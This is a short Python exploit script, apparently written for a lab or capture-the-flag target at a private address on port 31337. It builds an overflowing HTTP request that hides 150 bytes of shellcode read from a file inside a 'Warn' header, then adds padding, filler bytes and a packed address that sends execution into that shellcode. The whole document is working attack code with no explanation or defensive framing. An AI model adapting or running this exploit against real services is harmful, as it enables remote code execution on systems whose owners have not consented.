#!/usr/bin/python3

from socket import *
import struct

addr = '172.16.2.68'
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = b""
with open("exploit64", "rb") as fh:
    exploit = fh.read()
#exploit is 150 bytes

address = 0x41414021			    #address of the code in the global buffer
PADLEN = 540

x = b'GET /asdf.vbs HTTP/1.1\r\n'
x += b'Warn:' + b'199 ' + exploit
x += b'A' * (PADLEN - len(exploit))
x += b'\xFF'*8				    #Fill 8 byte arg used in strcat with F's
x += struct.pack("<Q", address)		    #Fill func argument with the address of our code from the global buffer

x += b'\r\n'
x += b'\r\n'

s.send(x)
